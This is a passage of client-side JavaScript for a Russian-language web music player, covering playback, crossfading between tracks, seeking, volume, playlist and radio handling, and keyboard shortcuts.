        radio: false,
        version: $("html").attr("id")
    };
    self.error_timer = [];
    self.error_timer_count = [];
    self.counters_started = null;
    self.init = function() {
        SM.setup({
            autoStart: false,
            useThrottling: false,
            usePeakData: true,
            useWaveformData: false,
            useEQData: false,
            useFavIcon: false,
            url: self.data.url.swf,
            preferFlash: false,
            flashVersion: 9,
            useHighPerformance: true,
            debugMode: false,
            ontimeout: function(e) {
                SM.flashLoadTimeout = 0;
                SM.onerror = {};
                SM.reboot();
            },
            onready: function() {
                self.playlist.init();
                self.ui.init();
                self.playlist.user_pl.init();
            }
        });
    };
    self.sound = function(i, pl, track, info, action, skip) {
        var next_sound = null;
        i = (typeof i == 'undefined') ? self.state.i : i;
        pl = (typeof pl == 'undefined') ? self.state.pl : pl;
        track = (typeof track == 'undefined') ? self.track(i, pl) : track;
        info = (typeof info == 'undefined') ? self.info(track) : info;
        clearTimeout(self.error_timer[info.id]);
        if (action == 'load') {
            SM.destroySound('sound' + info.id);
        } else {
            var sobj = SM.getSoundById('sound' + info.id);
        }
        sound = (typeof sobj == 'object') ? sobj : SM.createSound({
            id: 'sound' + info.id,
            url: info.mp3.replace('/download/', '/listen/').replace('/file/', '/listen/'),
            onload: function() {
                var rState = this.readyState;
                $msg_conta = track.children("div.container_message");
                if (rState == 3 && $msg_conta.length) {
                    if ($msg_conta.data("ready") < 3) {
                        rState = 2;
                    }
                }
                if (rState == 2) {
                    if (pl == 'main') {
                        if (skip) {
                            if (!track.children("div.container_message").length) {
                                track.append('<div class="container_message playlist-oo_missed" data-ready="0"><i>Песня пропущена</i><b>Повторить попытку ?</b></div>');
                            }
                            SM.stopAll();
                            self.next(true);
                        } else {
                            self.error_timer_count[info.id] = (typeof self.error_timer_count[info.id] == 'undefined') ? 1 : parseInt(self.error_timer_count[info.id]) + 1;
                            var count = self.error_timer_count[info.id];
                            if (count == 1) {
                                $msg_conta = track.children("div.container_message");
                                if ($msg_conta.length) {
                                    $msg_conta.remove();
                                }
                                track.append('<div class="container_message playlist-oo_loading" data-ready="0"><i>Поиск данной песни</i><b><span data-id="' + info.id + '">20</span> сек.</b></div>');
                                if (!self.counters_started)
                                    self.inc404counters();
                            }
                            if (count < 4) {
                                self.error_timer[info.id] = setTimeout(function() {
                                    self.sound(i, pl, track, info, 'load');
                                }, 6000);
                            } else if (self.error_timer_count[info.id] > 3) {
                                self.error_timer_count[info.id] = 0;
                                var msg_conta = track.children("div.container_message");
                                msg_conta.removeClass("playlist-oo_loading");
                                msg_conta.removeClass("playlist-oo_missed");
                                msg_conta.addClass("playlist-oo_error");
                                self.ui.notify(self.data.text.unavailable);
                                _sound = self.state.sound;
                                var prev_id = (_sound != null) ? _sound.id : null;
                                if (sound.id == prev_id) {
                                    SM.stopAll();
                                    self.next(true);
                                    msg_conta.html('<i>Упс...404... Песня не найдена</i><b>' + self.data.text.unavailable404skipped + '</b>');
                                } else {
                                    msg_conta.html('<i>Упс...404... Песня не найдена</i><b>' + self.data.text.unavailable404 + '</b>');
                                }
                                SM.destroySound('sound' + info.id);
                            }
                        }
                    } else {
                        SM.stopAll();
                        self.next(true);
                    }
                } else {
                    $msg_conta = track.children("div.container_message");
                    if ($msg_conta.length) {
                        self.error_timer_count[info.id] = 0;
                        $msg_conta.remove();
                        _sound = self.state.sound;
                        var prev_id = (_sound != null) ? _sound.id : null;
                        if (sound.id == prev_id) {
                            SM.stopAll();
                            self.play(i, pl);
                        } else if (pl == 'main') {
                            track.addClass('playlist-oo_found');
                        }
                    }
                }
            },
            onstop: function() {
                this.destruct();
            },
            onplay: function() {
                this.dur = this.durationEstimate;
                var loaded = (this.readyState != 3) ? '0' : '100%';
                $(self.ui.css.progress.loaded).css({
                    width: loaded
                });
                if (this.position > 0) this.setPosition(0);
                var total = self.time(this.dur);
                $(self.ui.css.progress.time).text('0:00');
                $(self.ui.css.progress.total).html(self.state.pl == 'radio' ? '<span style="font-size:16px;">&infin;</span>' : total);
            },
            onfinish: function() {
                if (this.isHTML5) self.next(true);
            },
            whileloading: function() {
                if (this.active) {
                    this.dur = this.durationEstimate;
                    var percent = ((this.bytesLoaded / this.bytesTotal) * 100).toFixed(2);
                    $(self.ui.css.progress.loaded).css({
                        width: percent + '%'
                    });
                }
            },
            whileplaying: function() {
                if (this.active) {
                    $msg_conta = track.children("div.container_message");
                    if ($msg_conta.length && $msg_conta.data("ready") < 10) {
                        $msg_conta.data("ready", parseInt($msg_conta.data("ready")) + 1);
                    }
                    this.dur = this.durationEstimate;
                    var
                        percent = ((this.position / this.dur) * 100).toFixed(2),
                        time = self.time(this.position),
                        remain = parseInt(this.dur) - parseInt(this.position),
                        total = self.time(this.dur);
                    if (this.position < 100) self.ui.notify(self.data.text.loading, 1);
                    if (!self.ui.seek.animated) $(self.ui.css.progress.position).css({
                        width: percent + '%'
                    });
                    $(self.ui.css.progress.time).text(time);
                    $(self.ui.css.progress.total).html(self.state.pl == 'radio' ? '<span style="font-size:16px;">&infin;</span>' : total);
                    self.state.position = this.position;
                }
                if (!this.isHTML5) {
                    if (remain < self.crossfade.preload && typeof next_sound !== 'object') {
                        next_sound = self.sound(self.get_next(), pl);
                        next_sound.load();
                    }
                    if (remain < self.crossfade.duration) {
                        self.next(true);
                        if (self.state.mode != 'repeat') {
                            this.active = false;
                            self.crossfade.fade_out(this);
                        }
                    }
                }
            }
        });
        if (action == 'load') sound.load();
        return sound;
    }
    self.play = function(i, pl, was_onnext) {
        if (typeof i != 'object' && pl == "main") {
            $('div#xbody span.mod__mini').remove();
            //var html = '<span class="rt_share mod__mini">' + SocialButtons.get($("#xbody li.track[data-index=" + i + "]").data('url_song')) + '</span>';
            var html = '';
            $("li.track[data-index=" + i + "] em .playlist-btn-addfav").before(html);
            $("li.track[data-index=" + i + "] em .ulist-del").after(html);
        }
        var sound = self.state.sound,
            _sound = self.state.sound,
            date = parseInt(new Date().getTime()),
            track, info, cover;
        i = (typeof i == 'undefined') ? 0 : i;
        pl = (typeof pl == 'undefined') ? 'main' : pl;
        track = self.track(i, pl);
        info = self.info(track);
        if (pl == "radio") $("div.radiobl li[data-index=" + i + "]").removeClass('act').addClass('pause');
        self.ui.notify(self.data.text.loading);
        skip = (typeof(was_onnext) == "undefined") ? 0 : 1;
        sound = self.sound(i, pl, track, info, null, skip);
        $(self.ui.css.progress.position).css({
            width: 0
        });
        self.ui.playback('play');
        self.ui.update(info);
        self.playlist.set(i, pl);
        createCookie('listen', 'true', 7);
        self.state.pl = pl;
        self.state.i = i;
        self.state.sound = sound;
        self.state.info = info;
        self.state.pb = 'play';
        self.state.started = true;
        self.state.paused = false;
        self.state.duration = info.duration;
        var prev_id = (_sound != null) ? _sound.id : null;
        if (sound.id == prev_id) {
            self.ui.seek.set(0, true, false);
            if (sound.paused) {
                sound.resume();
            } else if (sound.playState == 0) {
                sound.play();
                sound.active = true;
            }
        } else {
            if (date - self.crossfade.end < 4001) {
                SM.stopAll();
            } else {
                self.crossfade.fade_out(_sound);
            }
            self.crossfade.fade_in(sound);
            self.crossfade.end = date;
        }
        self.radio.update(info);
        if ($(':hover').length > 0) $.jStorage.set('player', new Date().getTime());
    }
    self.next = function(auto) {
        if (self.state.pl == "onesongblock") {
            if (self.state.mode == 'repeat') {
                self.play(self.state.i, self.state.pl);
            } else {
                self.stop();
            }
            return;
        }
        var i = self.get_next(auto),
            pl = self.state.pl,
            mode = self.state.mode;
        mode = ((mode == 'repeat' || mode == 'stop') && !auto) ? 'line' : mode;
        switch (mode) {
            case 'line':
                self.play(i, pl, true);
                break;
            case 'repeat':
                self.play(i, pl);
                break;
            case 'stop':
                self.stop();
                break;
            case 'shuffle':
                self.play(i, pl, true);
                break;
        }
    }
    self.prev = function() {
        var pl = self.state.pl,
            tracks;
        switch (pl) {
            case 'main':
                tracks = $(self.playlist.css.main.tracks);
                break;
            case 'radio':
                tracks = $(self.playlist.css.radio.main.stations);
                break;
        }
        var count = tracks.length,
            act = (tracks.filter('.act').length > 0),
            current = (act) ? self.state.i : 0,
            i = self.state.i,
            delay = self.data.delay,
            pb = self.state.pb,
            position = (pb == 'play' || pb == 'pause') ? self.state.position : 0;
        if (position > delay && pl != 'radio') {
            self.ui.seek.set(0, true, false);
        } else {
            i = (current > 0 || act) ? current - 1 : count - 1;
            if (!act) i = count - 1;
            self.play(i, pl);
        }
    }
    self.pause = function() {
        var
            i = self.state.i,
            pl = self.state.pl,
            sound = self.state.sound,
            act = ($('li.track.act, li.user-track.act').length > 0) ? true : false;
        sound.pause();
        if (act && pl == 'main') self.playlist.set(i, pl, 'pause');
        self.ui.playback('pause');
        self.state.pb = 'pause';
        self.state.paused = true;
        if (pl == "radio") $(".radiobl li[data-index=" + i + "]").removeClass('pause').find('a').trigger('changeState');
    }
    self.resume = function() {
        var
            i = self.state.i,
            pl = self.state.pl,
            sound = self.state.sound,
            info = self.state.info,
            act = ($('li.track.act, li.user-track.act').length > 0) ? true : false;
        self.state.pb = 'play';
        self.state.paused = false;
        if (pl == "radio") $(".radiobl li[data-index=" + i + "]").removeClass('act').addClass('pause').find('a').trigger('changeState');
        if (info.radio) {
            sound.destruct();
            self.play(self.state.i, self.state.pl);
        } else sound.resume();
        if (act && pl == 'main') self.playlist.set(i, pl);
        self.ui.playback('play');
        if ($(':hover').length > 0) $.jStorage.set('player', new Date().getTime());
    }
    self.stop = function() {
        if (!self.state.started) return;
        self.play(self.state.i, self.state.pl);
        self.pause();
    }
    self.ui = {
        css: {
            player: '#fixplayer',
            lcd: {
                container: '#fixplayer-lcd',
                title: {
                    container: '#fixplayer-title',
                    wrap: '#fixplayer-title span',
                    artist: '#fixplayer-title b',
                    song: '#fixplayer-title em'
                },
                notification: '#fixplayer-notification',
                cover: '#fixplayer-cover'
            },
            buttons: {
                playback: '#fixplayer-b_back, #fixplayer-b_next, #fixplayer-b_play, #fixplayer-b_pause',
                play: '#fixplayer-b_play',
                pause: '#fixplayer-b_pause',
                next: '#fixplayer-b_next',
                prev: '#fixplayer-b_back',
                add: '#fixplayer-addpl',
                remove: '#fixplayer-fav_del',
                download: '#fixplayer-down',
                mode: '#fixplayer-pv'
            },
            progress: {
                bar: '#fixplayer-prok',
                placeholder: '#fixplayer-prok',
                loaded: '#fixplayer-prok-sk',
                position: '#fixplayer-prok-pr',
                time: '#fixplayer-time b',
                total: '#fixplayer-time em'
            },
            volume: {
                container: '#fixplayer-volume',
                placeholder: '#fixplayer-volume',
                value: '#fixplayer-volume-x',
                mute: '#fixplayer-sound'
            }
        },
        pressed: false,
        holded: false,
        seek_delay: 500,
        seek_interval: 5000,
        seek_timer: null,
        init: function() {
            self.ui.mode.init();
            self.ui.seek.init();
            self.ui.volume.init();
            self.ui.buttons.init();
        },
        playback: function(mode) {
            if (mode == 'play') {
                $(self.ui.css.buttons.play).addClass('hidden');
                $(self.ui.css.buttons.pause).removeClass('hidden');
                self.ui.blink('stop');
            } else if (mode == 'pause') {
                $(self.ui.css.buttons.pause).addClass('hidden');
                $(self.ui.css.buttons.play).removeClass('hidden');
                self.ui.blink('start');
            } else if (mode == 'stop') {
                $(self.ui.css.buttons.pause).addClass('hidden');
                $(self.ui.css.buttons.play).removeClass('hidden');
                self.ui.blink('stop');
            }
            if (mode == 'stop') mode = 'default';
            if (self.state.volume == 0) self.favicon('mute');
            else self.favicon(mode);
        },
        update: function(info) {
            var $artist = $(self.ui.css.lcd.title.artist),
                $song = $(self.ui.css.lcd.title.song);
            var current = {
                artist: $artist.text(),
                song: $song.text()
            };
            if (typeof info.artist != 'undefined') $artist.text(info.artist);
            if (typeof info.song != 'undefined') $song.text(info.song);
            if (typeof info.artist != 'undefined' && info.artist != current.artist) self.ui.rotation();
            else if (typeof info.song != 'undefined' && info.song != current.song) self.ui.rotation();
            if (typeof info.mp3 != 'undefined') {
                $('#fixplayer').removeClass('noactive');
                $(self.ui.css.buttons.download).attr('href', info.mp3);
                $(self.ui.css.buttons.download).attr('onclick', "Counters.goal('fixplayerDownload');");
            }
        },
        rotation: function() {
            var lcd = $(self.ui.css.lcd.container),
                text = $(self.ui.css.lcd.title.wrap),
                diff = text.width() - lcd.width(),
                coef = 0.03;
            if (diff > 0) {
                text.stop(true, false).stopTime('controlled').animate({
                    marginLeft: 0
                }, 200).everyTime(500, 'controlled', function() {
                    text.animate({
                        marginLeft: '-' + diff + 'px'
                    }, diff / coef, 'swing');
                    text.animate({
                        marginLeft: 0
                    }, diff / coef, 'swing');
                });
            } else {
                text.stop(true, false).stopTime('controlled').animate({
                    marginLeft: 0
                }, 200, 'swing');
            }
        },
        mode: {
            modes: ['line', 'repeat', 'shuffle', 'stop'],
            init: function() {
                var mode = (readCookie('mode') != null) ? readCookie('mode') : self.state.mode;
                self.ui.mode.set(mode, false);
                $(self.ui.css.buttons.mode).click(function(event) {
                    self.ui.mode.set();
                    //Counters.goal('fixplayerMode');
                    event.preventDefault();
                });
            },
            set: function(mode, notify) {
                var
                    button = $(self.ui.css.buttons.mode),
                    modes = self.ui.mode.modes,
                    current = self.state.mode,
                    next_index = modes.indexOf(current) + 1,
                    next_mode = (next_index >= modes.length) ? modes[0] : modes[next_index],
                    all_class = modes.join(' ');
                mode = (typeof mode == 'undefined') ? next_mode : mode;
                notify = (typeof notify == 'undefined') ? true : notify;
                button.removeClass(all_class).addClass(mode);
                button.text(self.data.text.mode[mode]);
                self.state.mode = mode;
                createCookie('mode', mode, 100);
                if (notify) self.ui.notify(self.data.text.mode.prefix + '<strong>' + self.data.text.mode[mode] + '</strong>');
            }
        },
        seek: {
            pressed: false,
            animated: false,
            inside: false,
            init: function() {
                $(document).bind({
                    mousemove: function(event) {
                        if (self.ui.seek.pressed == true && self.ui.seek.inside == false) {
                            var width = $(self.ui.css.progress.placeholder).width(),
                                offsetX = event.pageX - $(self.ui.css.progress.placeholder).offset().left,
                                percent = ((offsetX / width) * 100).toFixed(2);
                            self.ui.seek.set(percent, false, true);
                        }
                    },
                    mouseup: function() {
                        self.ui.seek.pressed = false;
                    }
                });
                $(self.ui.css.progress.placeholder).bind({
                    mousedown: function(event) {
                        event = fixEvent(event, this);
                        self.ui.seek.pressed = true;
                        var width = $(this).width(),
                            offsetX = event.pageX - $(this).offset().left,
                            percent = ((offsetX / width) * 100).toFixed(2);
                        self.ui.seek.set(percent);
                        event.stopPropagation();
                        event.preventDefault();
                    },
                    mousemove: function(event) {
                        self.ui.seek.inside = true;
                        if (self.ui.seek.pressed) {
                            event = fixEvent(event, this);
                            var width = $(this).width(),
                                offsetX = event.pageX - $(this).offset().left,
                                percent = ((offsetX / width) * 100).toFixed(2);
                            self.ui.seek.set(percent, false);
                            $(this).css({
                                cursor: 'e-resize'
                            });
                        } else {
                            $(this).css({
                                cursor: 'default'
                            });
                        }
                    },
                    mouseleave: function() {
                        self.ui.seek.inside = false;
                    },
                    mouseup: function() {
                        self.ui.seek.pressed = false;
                    }
                });
                self.ui.seek.set(0, false, false);
            },
            set: function(percent, animate, notify) {
                var sound = self.state.sound,
                    position = $(self.ui.css.progress.position),
                    time = $(self.ui.css.progress.time),
                    ms = 0;
                animate = (typeof animate == 'undefined') ? true : animate;
                notify = (typeof notify == 'undefined') ? true : notify;
                loaded = 0;
                if (sound !== null) {
                    ms = ((sound.durationEstimate / 100) * percent).toFixed();
                    if (ms < 0) ms = 0;
                    if (ms > sound.durationEstimate) ms = sound.durationEstimate;
                    if (percent < 0) percent = 0;
                    if (percent > 100) percent = 100;
                    loaded = ((sound.bytesLoaded / sound.bytesTotal) * 100).toFixed();
                    percent = (parseInt(percent) > parseInt(loaded)) ? loaded : percent;
                    if (animate) {
                        self.ui.seek.animated = true;
                        position.stop(true, false).animate({
                            width: percent + '%'
                        }, 100, function() {
                            self.ui.seek.animated = false;
                        });
                    } else {
                        position.stop(true, false).css({
                            width: percent + '%'
                        });
                    }
                    if (notify) self.ui.notify(self.data.text.seek + parseInt(percent).toFixed() + '%', 1);
                    time.text(self.time(ms));
                    sound.setPosition(ms);
                    if (self.state.paused) self.state.position = ms;
                }
            },
            forward: function(animate) {
                var time = parseInt(self.state.position),
                    duration = parseInt(self.state.duration),
                    interval = self.ui.seek_interval,
                    new_time, percent;
                new_time = time + interval;
                percent = ((new_time / duration) * 100).toFixed();
                animate = (typeof animate == 'undefined') ? true : animate;
                clearTimeout(self.ui.quick_seek_timer);
                self.ui.quick_seek_timer = setTimeout(function() {
                    if (parseInt(percent) > 99) self.next(true);
                    else self.ui.seek.set(percent, animate);
                }, 100);
            },
            rewind: function(animate) {
                var time = self.state.position,
                    duration = self.state.duration,
                    interval = self.ui.seek_interval,
                    new_time, percent;
                new_time = time - interval;
                percent = ((new_time / duration) * 100).toFixed();
                percent = (percent < 0) ? 0 : percent;
                animate = (typeof animate == 'undefined') ? true : animate;
                clearTimeout(self.ui.quick_seek_timer);
                self.ui.quick_seek_timer = setTimeout(function() {
                    self.ui.seek.set(percent, animate);
                }, 100);
            }
        },
        volume: {
            pressed: false,
            inside: false,
            init: function() {
                var volume = (readCookie('volume') != null) ? readCookie('volume') : self.state.volume,
                    unmute = (readCookie('muted') != null) ? readCookie('muted') : false;
                volume = (self.state.version == "mobile") ? 100 : volume;
                self.ui.volume.set(volume, false, false);
                if (unmute !== false) {
                    self.state.unmute = unmute;
                    self.state.muted = true;
                }
                document.onmousemove = function(event) {
                    event = fixEvent(event, this);
                    if (self.ui.volume.pressed == true && self.ui.volume.inside == false) {
                        var $bar = $(self.ui.css.volume.placeholder),
                            width = $bar.width(),
                            offsetX = event.pageX - $bar.offset().left,
                            percent = ((offsetX / width) * 100).toFixed(2);
                        self.ui.volume.set(percent, false, true);
                    }
                }
                document.onmouseup = function() {
                    self.ui.volume.pressed = false;
                }
                $(self.ui.css.volume.placeholder).bind({
                    mousedown: function(event) {
                        event = fixEvent(event, this);
                        self.ui.volume.pressed = true;
                        var width = $(this).width(),
                            offsetX = event.pageX - $(this).offset().left,
                            percent = ((offsetX / width) * 100).toFixed(2);
                        self.ui.volume.set(percent);
                        event.stopPropagation();
                        event.preventDefault();
                    },
                    mousemove: function(event) {
                        self.ui.volume.inside = true;
                        if (self.ui.volume.pressed) {
                            event = fixEvent(event, this);
                            var width = $(this).width(),
                                offsetX = event.pageX - $(this).offset().left,
                                percent = ((offsetX / width) * 100).toFixed(2);
                            self.ui.volume.set(percent, false, true);
                        }
                    },
                    mouseleave: function() {
                        self.ui.volume.inside = false;
                    },
                    mouseup: function() {
                        self.ui.volume.pressed = false;
                    }
                })
                $(self.ui.css.volume.container).bind({
                    mousewheel: function(event, delta) {
                        if (delta < 0) {
                            self.ui.volume.set('-');
                        } else if (delta > 0) {
                            self.ui.volume.set('+');
                        }
                        event.preventDefault();
                    }
                });
                $(self.ui.css.volume.mute).click(function(event) {
                    var muted = self.state.muted;
                    if (muted) self.ui.volume.unmute();
                    else self.ui.volume.mute();
                    //Counters.goal('fixplayerMute');
                    event.preventDefault();
                });
            },
            set: function(percent, animate, notify) {
                var percent_step = 2;
                var icon = $(self.ui.css.volume.mute),
                    value = $(self.ui.css.volume.value),
                    sound = self.state.sound,
                    state = self.state.pb,
                    volume = parseInt(self.state.volume);
                if (percent == '+') percent = volume + percent_step;
                else if (percent == '-') percent = volume - percent_step;
                percent = (parseInt(percent) > 100) ? 100 : parseInt(percent).toFixed();
                percent = (parseInt(percent) < 0) ? 0 : parseInt(percent).toFixed();
                animate = (typeof animate == 'undefined') ? true : animate;
                notify = (typeof notify == 'undefined') ? true : notify;
                if (sound != null) {
                    sound.unmute();
                    sound.setVolume(percent);
                }
                self.state.volume = percent;
                self.state.unmute = percent;
                self.state.muted = false;
                createCookie('volume', percent, 100);
                eraseCookie('muted');
                if (animate) value.stop(true, false).animate({
                    width: percent + '%'
                }, 100);
                else value.css({
                    width: percent + '%'
                });
                if (notify) self.ui.notify(self.data.text.volume + percent + '%', 1);
                if (percent == 0) icon.removeClass('on').addClass('off');
                else icon.removeClass('off').addClass('on');
                if (percent == 0) self.favicon('mute');
                else if (volume == 0) self.favicon(state.replace('stop', 'default'));
            },
            mute: function() {
                var volume = self.state.volume;
                self.ui.volume.set(0, true, false);
                self.ui.notify(self.data.text.mute);
                self.state.unmute = volume;
                self.state.muted = true;
                createCookie('muted', volume, 100);
            },
            unmute: function() {
                self.ui.volume.set(self.state.unmute);
            }
        },
        buttons: {
            init: function() {
                self.ui.buttons.playback();
                self.ui.buttons.media();
                self.ui.buttons.add();
            },
            playback: function() {
                $(self.ui.css.buttons.playback).bind({
                    mousedown: function(event) {
                        var id = event.target.id,
                            button = {
                                next: self.ui.css.buttons.next.replace('#', ''),
                                prev: self.ui.css.buttons.prev.replace('#', '')
                            };
                        if (id == button.next || id == button.prev) {
                            if (id == button.prev) {
                                //Counters.goal('fixplayerPrev');
                            } else if (id == button.next) {
                                //Counters.goal('fixplayerNext');
                            }
                            self.ui.pressed = new Date().getTime();
                            self.ui.seek_timer = window.setInterval(function() {
                                var now = new Date().getTime();
                                if (self.ui.pressed && ((now - self.ui.pressed) > self.ui.seek_delay)) {
                                    self.ui.holded = true;
                                    if (id == button.next) self.ui.seek.forward();
                                    else if (id == button.prev) self.ui.seek.rewind();
                                }
                            }, 300);
                        }
                        event.preventDefault();
                    },
                    mouseleave: function() {
                        self.ui.pressed = false;
                        clearInterval(self.ui.seek_timer);
                    },
                    mouseup: function(event) {
                        event = fixEvent(event);
                        var action = event.target.id,
                            button = {
                                play: self.ui.css.buttons.play.replace('#', ''),
                                pause: self.ui.css.buttons.pause.replace('#', ''),
                                next: self.ui.css.buttons.next.replace('#', ''),
                                prev: self.ui.css.buttons.prev.replace('#', '')
                            };
                        self.ui.pressed = false;
                        clearInterval(self.ui.seek_timer);
                        if (action == button.play) {
                            //Counters.goal('fixplayerPlay');
                            if ($('.act').length > 0) {
                                self.resume();
                            } else {
                                if (self.state.started) {
                                    self.play();
                                } else {
                                    self.play(0, 'main');
                                }
                            }
                        } else if (action == button.pause) {
                            self.pause();
                        } else if (action == button.next) {
                            if (!self.ui.holded) self.next();
                            self.ui.holded = false;
                        } else if (action == button.prev) {
                            if (!self.ui.holded) self.prev();
                            self.ui.holded = false;
                        }
                        event.preventDefault();
                    },
                    click: function(event) {
                        event.preventDefault();
                    }
                });
            },
            media: function() {
                $(document).keydown(function(event) {
                    var code = event.keyCode,
                        ctrl = event.ctrlKey;
                    if ($('input:text:focus, input:password:focus, textarea:focus').length > 0 || ctrl) return;
                    if (code == 179 || code == 80 || code == 88) {
                        $(self.ui.css.buttons.play + ':not(.hidden),' + self.ui.css.buttons.pause + ':not(.hidden)').trigger('mouseup');
                        event.preventDefault();
                    } else if (code == 177 || code == 90) {
                        self.prev();
                        event.preventDefault();
                    } else if (code == 176 || code == 67) {
                        self.next();
                        event.preventDefault();
                    } else if (code == 37) {
                        self.ui.seek.rewind(false);
                        event.preventDefault();
                    } else if (code == 39) {
                        self.ui.seek.forward(false);
                        event.preventDefault();
                    } else if (code == 77) {
                        $(self.ui.css.volume.mute).click();
                        event.preventDefault();
                    } else if (code == 89) {
                        self.ui.mode.set();
                        event.preventDefault();
                    } else if (code == 70) {
                        $(self.data.css.search).val('').focus();
                        $(window).scrollTop(0);
                        event.preventDefault();
                    }
                });
            },
            add: function() {
                $(self.ui.css.buttons.add).click(function(event) {
                    var info = self.state.info,
                        started = self.state.started;
                    //Counters.goal('fixplayerFav');
                    if (started) {
                        self.playlist.user_pl.add(info);
                        self.ui.notify(self.data.text.added);
                    }
                    event.preventDefault();
                });
            }
        },
        notify: function(text, time) {
            var lcd = $(self.ui.css.lcd.container),
                notification = $(self.ui.css.lcd.notification);
            time = (typeof time == 'undefined') ? parseInt(2400) : parseInt((time * 1000) + 400);
            notification.html(text);
            lcd.addClass('notify');
            clearTimeout(self.ui.notify_timer);
            self.ui.notify_timer = setTimeout(function() {
                lcd.removeClass('notify');
            }, time);
        },
        blink: function(action) {
            action = (typeof action == 'undefined') ? 'start' : action;
            if (action == 'start') $(self.ui.css.lcd.title.container).everyTime(1000, 'controlled', function() {
                $(this).animate({
                    opacity: 0.1
                }, 1000);
                $(this).animate({
                    opacity: 1
                }, 1000);
            });
            else $(self.ui.css.lcd.title.container).stop(true).stopTime('controlled').animate({
                opacity: 1
            }, 100);
        }
    };
    self.playlist = {
        css: {
            pagination: {
                container: 'ul.listalka'
            },
            main: {
                list: '.playlist',
                track: 'li.track',
                tracks: '.playlist li.track',
                play: 'a.playlist-btn-playback',
                download: 'a.playlist-btn-down',
                add: 'a.playlist-btn-addfav'
            },
            user: {
                remove: 'a.ulist-del'
            },
            all: {
                list: '.playlist, #user-playlist',
                tracks: 'li.track, li.user-track',
                stations: 'li.radio-station'
            },
            radio: {
                main: {
                    list: '.radiobl',
                    station: '.radio-station',
                    stations: '.radiobl .radio-station'
                }
            }
        },
        data: [],
        init: function() {
            self.playlist.reindex();
            self.playlist.events();
            tryNum = 0;
        },
        tracks: function(pl) {
            var collection, tracks = [];
            pl = (typeof(pl) == 'undefined') ? 'main' : pl;
            collection = $(self.playlist.css.main_tracks);
            collection.each(function(i) {
                tracks[i] = self.info($(this));
            });
            return tracks;
        },
        reindex: function() {
            $(self.playlist.css.main.tracks).each(function(i) {
                $(this).data('index', i);
                $(this).attr('data-index', i);
            });
            self.state.i = self.playlist.act();
            self.playlist.empty();
            if (typeof RBT.tracklist == "function" && $('html').attr('id') !== 'desktop') {
                $(self.playlist.css.main.tracks).rbtify(RBT.tracklist());
            }
        },
        empty: function() {
            if ($('.favorites').length && !$(self.playlist.css.main.tracks).length && !$('.gl__alter').length) {
                $('.xblock').append('<div class="gl__alter mod-error">Плейлист пуст.</div>');
            }
        },
        act: function() {
            if (self.state.pl == 'onesongblock') return 0;
            var pl = self.state.pl,
                tracks = $(self.playlist.css.main.tracks),
                index = (tracks.filter('.act').length > 0) ? parseInt(tracks.filter('.act').attr('data-index')) : 0;
            return index;
        },
        set: function(i, pl, mode) {
            var act = 'act';
            pl = (typeof pl == 'undefined') ? 'main' : pl;
            mode = (typeof mode == 'undefined') ? 'play' : mode;
            var $track = self.track(i, pl);
            $('li.act').removeClass(act);
            $(self.playlist.css.main.play).removeClass('playlist-btn-pause').addClass('playlist-btn-play');
            $('#fixplayer .minishare').remove();
            var tmptitlek = $track.find("h2").text();
            if (tmptitlek == "") tmptitlek = $('.onesongblock-title b').text() + ' - ' + $('.onesongblock-title em').text();
            if (mode == 'stop') return;
            switch (pl) {
                case 'main':
                    $track.addClass(act);
                    var $button = $track.find(self.playlist.css.main.play);
                    if (mode == 'pause') $button.removeClass('playlist-btn-pause').addClass('playlist-btn-play');
                    else if (mode == 'play') $button.removeClass('playlist-btn-play').addClass('playlist-btn-pause');
                    break;
                default:
                    $track.addClass(act);
                    break;
            }
        },
        events: function() {
            $(document).on('click', self.playlist.css.main.play, function(event) {
                var li = $(this).closest('.track');
                var i = li.attr("data-index"),
                    pl = (li.hasClass('track')) ? 'main' : 'user',
                    paused = player.state.paused,
                    act = (li.hasClass('act')) ? true : false;
                //Counters.goal('tracklistPlay');
                if (act) {
                    if (paused) self.resume();
                    else self.pause();
                } else self.play(i, pl);
                event.preventDefault();
            });
            $(document).on('click', self.playlist.css.main.download, function(e) {
                e.stopPropagation();
                var i = $(this).parent().parent().attr("data-index"),
                    info = self.info(self.track(i, 'main'));
                //Counters.goal('tracklistDownload');
                //$.ajax({
                //    type: "POST",
                //    async: false,
                //    contentType: "application/x-www-form-urlencoded",
                //    dataType: 'json',
                //    url: self.data.url.download,
                //    data: {
                //        song_id: info.id,
                //        song_name: info.song,
                //        song_mp3: info.mp3,
                //        song_artist: info.artist
                //    },
                //    success: function(data) {
                //        if (data.download == false) {
                //            e.preventDefault();
                //            $('body').prepend(data.code);
                //        }
                //    }
                //});
                e.stopPropagation();
            });
            $(document).on('click', self.playlist.css.main.add, function(event) {
                var info = self.info($(this).parent('em').parent(self.playlist.css.main.track));
                //Counters.goal('tracklistFav');
                self.playlist.user_pl.add(info);
                event.stopPropagation();
                event.preventDefault();
            });
            $(document).on('click', self.playlist.css.user.remove, function(event) {
                var i = $(this).parent('em').parent(self.playlist.css.main.track).data("index");
                self.playlist.user_pl.remove(i);
                event.stopPropagation();
                event.preventDefault();
            });
            $(document).on('click', self.playlist.css.all.stations + " div.radiobl-cover", function(event) {
                var i = $(this).parent("li").data('index'),
                    pl = 'radio',
                    paused = player.state.paused,
                    act = ($(this).parent("li").hasClass('act')) ? true : false;
                if (act) {
                    if (paused) self.resume();
                    else
                        self.pause();
                } else self.play(i, pl);
                event.preventDefault();
            });
        },
        tools: function() {},
        activate: function() {
            var id = (self.state.info !== null) ? self.state.info.id : false,
                track, mode = (self.state.paused) ? 'pause' : 'play',
                pl = self.state.pl;
            if (!id) return;
            track = $(self.playlist.css.all.tracks).not('.user-track').filter('li[data-id="' + id + '"]').filter(':first');
            if (track.length > 0) self.playlist.set(track.data('index'), pl, mode);
            if (pl == "radio") {
                self.state.i = 4;
                var radioItem = $(".radiobl li[data-id=" + id + "]");
                if (self.state.paused) {
                    $('.oneradioblock').find(radioItem).find('a').text('Слушать онлайн');
                    radioItem.removeClass('pause');
                } else {
                    $('.oneradioblock').find(radioItem).find('a').text('Включить паузу');
                    radioItem.addClass('pause');
                }
                radioItem.addClass('act');
            }
        },
        user_pl: {
            init: function() {
                self.playlist.user_pl.sortable();
            },
            add: function(info) {
                $.ajax({
                    type: 'POST',
                    url: self.data.url.save_pl,
                    dataType: 'json',
                    data: {
                        action: "add",
                        track_id: info.id
                    }
                }).done(function(data) {
                    if (data.status && data.title) {
                        Notify.show('', data.status, 2, data.title);
                        if (data.status === 'success') {
                            $(self.playlist.css.main.tracks).eq(info.index).addClass('favourite');
                        }
                    }
                    if (data.html) {
                        $('body').append($(data.html));
